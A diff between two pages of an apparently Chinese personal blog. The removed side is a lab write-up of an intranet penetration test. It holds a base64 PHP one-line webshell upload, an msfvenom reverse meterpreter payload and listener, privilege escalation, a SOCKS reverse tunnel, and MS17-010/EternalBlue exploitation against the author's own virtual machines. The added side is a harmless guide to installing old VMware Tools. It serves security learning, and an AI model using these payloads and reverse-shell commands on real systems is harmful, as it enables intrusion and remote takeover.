@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="记录一次内网渗透的实验, Wkai">
+    <meta name="keywords" content="VMware安装旧版本vmtools, Wkai">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>记录一次内网渗透的实验 | Wkai</title>
+    <title>VMware安装旧版本vmtools | Wkai</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -201,12 +201,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(1).png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard(6).png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">记录一次内网渗透的实验</h1>
+                    <h1 class="description center-align post-title">VMware安装旧版本vmtools</h1>
                 </div>
             </div>
         </div>
@@ -321,9 +321,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/VMware/">
+                                <span class="chip bg-color">VMware</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -331,8 +335,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
-                                渗透测试
+                            <a href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" class="post-category">
+                                工具使用
                             </a>
                         
                     </div>
@@ -344,7 +348,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-03-28
+                    2019-06-23
                 </div>
                 
 
@@ -360,70 +364,41 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>实验是很久以前的，一直在笔记里放灰</p>
-<p>靶机里有两张网卡一张是NAT用来模拟外网，一张是仅限主机模式，用来模拟内网</p>
-<p>靶机上有个站点，可以通过外网访问</p>
-<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(5).png" alt></p>
-<p>看关于网站，可以得知网站是什么CMS</p>
-<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(8).png" alt></p>
-<p>可以找到上传点</p>
-<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard.png" alt></p>
-<p>随便上传一个文件，再抓包，发现可以改包上传其他文件</p>
-<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(7).png" alt></p>
-<p>我们上传一个一句话木马</p>
-<pre><code>data:image/php;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk/Pg==
-经过URL编码后：
-data%3Aimage%2Fphp%3Bbase64%2CPD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk%2FPg%3D%3D</code></pre><p>将更改后的包放出去</p>
-<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(3).png" alt></p>
-<p>显示虽然上传失败，但是其实是上传成功的</p>
-<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(11).png" alt></p>
-<p>用菜刀连接</p>
-<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(6).png" alt></p>
-<p>因为系统权限不够，做不了代理，所以需要上传另一个后门</p>
-<p>&emsp;先在kali用msfvenom生成反向连接后门</p>
-<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.10.129  lport=12345 -f exe &gt;shell.exe</code></pre><p>&emsp;用菜刀上传该后门</p>
-<p>&emsp;kali开启监听</p>
-<pre><code>msfconsole
-use exploit/multi/handler
-set payload windows/windows/x64/meterpreter/reverse_tcp
-set lhost 192.168.10.129
-set lport 12345
-run</code></pre><p>&emsp;在菜刀终端中执行后门</p>
-<p>&emsp;获得meterpreter会话</p>
-<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(12).png" alt></p>
-<p>&emsp;绑定稳定进程</p>
-<pre><code>migrate 6912</code></pre><p>&emsp;查看权限</p>
-<pre><code>getuid</code></pre><p>&emsp;提升权限</p>
-<pre><code>getsystem</code></pre><p>&emsp;进入shell</p>
-<pre><code>shell</code></pre><p>&emsp;发现内网网段</p>
-<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(10).png" alt></p>
-<p>&emsp;接下来可以做代理，也可以做静态路由</p>
-<p>&emsp;那么就先试试做代理吧</p>
-<p>&emsp;kali先开启监听</p>
-<pre><code>./ew_for_linux -s rcsocks -e 8888 -l 1080</code></pre><p>&emsp;在靶机上</p>
-<pre><code>ew.exe -s rssocks -d 192.168.10.129 -e 8888</code></pre><p>&emsp;成功连接</p>
-<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(2).png" alt></p>
-<p>&emsp;接下来就得使用代理工具proxychains了</p>
-<p>&emsp;用vim编辑/etc/proxychains.conf</p>
-<pre><code>在最后一行加入
-socks5 127.0.0.1 1080
-注释掉其他的代理地址</code></pre><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/1.png" alt></p>
-<p>&emsp;需要使用代理在命令前加proxychains<br>&emsp;例如：proxychains msfconsole<br>&emsp;使用代理之后我们就可以访问内网了</p>
-<p>搜索内网中能使用ms17-010漏洞的主机</p>
-<pre><code>proxychains msfconsole
-search ms17-010
-use auxiliary/scanner/smb/smb_ms17_010
-set rhosts 10.10.10.130-10.10.10.135
-run</code></pre><p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(9).png" alt></p>
-<p>&emsp;那我们可以开始使用攻击模块了</p>
-<pre><code>use exploit/windows/smb/ms17_010_eternalblue
-set payload windows/x64/meterpreter/reverse_tcp
-set rhosts 10.10.10.133
-set lhost 192.168.10.10
-run</code></pre><p>&emsp;开始攻击</p>
-<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(1).png" alt></p>
-<p>&emsp;但是最后我没有成功，可能是虚拟机的问题，最后使用静态路由也没法成功，应该是虚拟机问题</p>
-<p><img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(4).png" alt></p>
+                <ul>
+<li>很多时候我们需要安装未打补丁的系统来作为练习靶场，而为未打补丁的系统是无法直接安装新版本的vmtools的</li>
+</ul>
+<p><img src="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard(6).png" alt></p>
+<ul>
+<li>但是我们可以手动安装旧版本的vmtools</li>
+<li>在这个网址我们可以下载历史版本的vmtools，<a href="http://softwareupdate.vmware.com/cds/vmw-desktop/ws/" target="_blank" rel="noopener">http://softwareupdate.vmware.com/cds/vmw-desktop/ws/</a></li>
+<li>比如我们需要下载14.1.8版本的vmtools</li>
+<li>我们就可以打开网址选择14.1.8</li>
+</ul>
+<p><img src="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard(2).png" alt></p>
+<ul>
+<li>最后进入到目录/14921873/windows/packages/中</li>
+</ul>
+<p><img src="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard(7).png" alt></p>
+<ul>
+<li>下载完后需要解压出里面的iso文件</li>
+</ul>
+<p><img src="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard(5).png" alt></p>
+<ul>
+<li>接着在需要安装vmtools的系统中添加一个新的CD驱动器</li>
+</ul>
+<p><img src="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard(4).png" alt></p>
+<ul>
+<li>添加完新的CD驱动后，给驱动选择下载好的vmtools.iso</li>
+</ul>
+<p><img src="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard(3).png" alt></p>
+<ul>
+<li>添加完后，就可以弹出安装程序了</li>
+</ul>
+<p><img src="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard(1).png" alt></p>
+<ul>
+<li>最后就是正常的安装流程了</li>
+</ul>
+<p><img src="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard.png" alt></p>
 
             </div>
             <hr/>
@@ -449,7 +424,7 @@ run</code></pre><p>&emsp;开始攻击</p>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://wkaiblog.cn/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/">http://wkaiblog.cn/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/</a>
+                    <a href="http://wkaiblog.cn/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/">http://wkaiblog.cn/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -486,7 +461,11 @@ run</code></pre><p>&emsp;开始攻击</p>
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/VMware/">
+                                    <span class="chip bg-color">VMware</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -656,46 +635,43 @@ run</code></pre><p>&emsp;开始攻击</p>
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/06/02/hexo_Blog_crate/">
+                <a href="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/">
                     <div class="card-image">
                         
+                        <img src="/2020/03/28/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E5%AE%9E%E9%AA%8C/clipboard(1).png" class="responsive-img" alt="记录一次内网渗透的实验">
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="hexo个人博客快速搭建">
-                        
-                        <span class="card-title">hexo个人博客快速搭建</span>
+                        <span class="card-title">记录一次内网渗透的实验</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            1. 安装 Git Bash&emsp;Git官方网站 https://git-scm.com/downloads
-2. 安装 Node js&emsp;Node.js官方网站 http://nodejs.cn/
-3. 安装hexonpm 
+                            实验是很久以前的，一直在笔记里放灰
+靶机里有两张网卡一张是NAT用来模拟外网，一张是仅限主机模式，用来模拟内网
+靶机上有个站点，可以通过外网访问
+
+看关于网站，可以得知网站是什么CMS
+
+可以找到上传点
+
+随便上传一个文件，再抓包，发现可以
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-06-02
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-28
                         </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" class="post-category">
-                                    博客搭建
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
                                 </a>
                             
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/hexo/">
-                        <span class="chip bg-color">hexo</span>
-                    </a>
-                    
                 </div>
                 
             </div>
@@ -704,7 +680,7 @@ run</code></pre><p>&emsp;开始攻击</p>
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+                本篇&nbsp;<i class="far fa-dot-circle"></i>
             </div>
             <div class="card">
                 <a href="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/">
@@ -743,6 +719,7 @@ run</code></pre><p>&emsp;开始攻击</p>
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
